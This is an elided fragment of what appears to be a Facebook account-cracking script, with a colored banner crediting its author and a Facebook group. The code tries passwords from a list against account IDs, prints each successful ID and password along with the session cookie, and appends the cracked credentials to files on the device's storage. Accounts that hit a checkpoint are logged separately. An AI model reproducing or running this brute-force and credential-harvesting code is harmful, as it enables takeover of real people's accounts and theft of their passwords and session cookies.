...
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mMADE BY     : Tajul Islam Rabbi

\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB          : Tajul Islam Rabbi

\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP    : I Love U
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \33[1;30m(xxx-OK 💚)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')

                cek_apk(session,coki)

                open('/sdcard/xxx-OK.txt', 'a').write( cid+' | '+ps+'\n')
                ...
                print('   \033[1;32m(xxx-CP 💔)  ' +cid+ ' | ' +ps+           '  \33[0;97m')

                open('/sdcard/xxx-CP.txt', 'a').write( cid+' | '+ps+' \n')
        ...
        sys.stdout.write('\r %s[ Tajul-14 ] [%s/%s]  CP:- %s  OK:- %s \r'%(H,loop,tl,len(oks),len(cps))),
